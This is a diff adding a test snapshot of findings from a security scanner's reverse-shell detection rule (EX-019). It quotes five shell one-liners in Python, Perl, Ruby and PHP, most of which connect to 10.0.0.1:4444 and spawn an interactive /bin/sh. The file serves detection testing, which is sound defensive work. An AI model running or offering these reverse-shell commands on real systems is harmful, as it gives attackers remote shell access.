@@ -1,0 +1,61 @@
+---
+source: src/rules/builtin/exfiltration.rs
+expression: findings
+---
+[
+  {
+    "id": "EX-019",
+    "severity": "critical",
+    "category": "exfiltration",
+    "confidence": "firm",
+    "name": "Scripting-language reverse shell",
+    "line": 8,
+    "code": "python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"10.0.0.1\",4444));os.dup2(s.fileno(),0);subprocess.call([\"/bin/sh\",\"-i\"])'",
+    "message": "Scripting-language reverse shell detected: socket + shell-exec primitives are being combined to open an interactive shell to a remote host.",
+    "recommendation": "Remove the reverse-shell construct and audit the surrounding script. Artifacts must not open interactive shells to the network."
+  },
+  {
+    "id": "EX-019",
+    "severity": "critical",
+    "category": "exfiltration",
+    "confidence": "firm",
+    "name": "Scripting-language reverse shell",
+    "line": 9,
+    "code": "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
+    "message": "Scripting-language reverse shell detected: socket + shell-exec primitives are being combined to open an interactive shell to a remote host.",
+    "recommendation": "Remove the reverse-shell construct and audit the surrounding script. Artifacts must not open interactive shells to the network."
+  },
+  {
+    "id": "EX-019",
+    "severity": "critical",
+    "category": "exfiltration",
+    "confidence": "firm",
+    "name": "Scripting-language reverse shell",
+    "line": 10,
+    "code": "perl -e 'use Socket;connect(S,...);exec(\"/bin/sh -i\");'",
+    "message": "Scripting-language reverse shell detected: socket + shell-exec primitives are being combined to open an interactive shell to a remote host.",
+    "recommendation": "Remove the reverse-shell construct and audit the surrounding script. Artifacts must not open interactive shells to the network."
+  },
+  {
+    "id": "EX-019",
+    "severity": "critical",
+    "category": "exfiltration",
+    "confidence": "firm",
+    "name": "Scripting-language reverse shell",
+    "line": 11,
+    "code": "ruby -rsocket -e 'c=TCPSocket.new(\"10.0.0.1\",\"4444\");exec\"/bin/sh -i\"'",
+    "message": "Scripting-language reverse shell detected: socket + shell-exec primitives are being combined to open an interactive shell to a remote host.",
+    "recommendation": "Remove the reverse-shell construct and audit the surrounding script. Artifacts must not open interactive shells to the network."
+  },
+  {
+    "id": "EX-019",
+    "severity": "critical",
+    "category": "exfiltration",
+    "confidence": "firm",
+    "name": "Scripting-language reverse shell",
+    "line": 12,
+    "code": "php -r '$s=fsockopen(\"10.0.0.1\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
+    "message": "Scripting-language reverse shell detected: socket + shell-exec primitives are being combined to open an interactive shell to a remote host.",
+    "recommendation": "Remove the reverse-shell construct and audit the surrounding script. Artifacts must not open interactive shells to the network."
+  }
+]
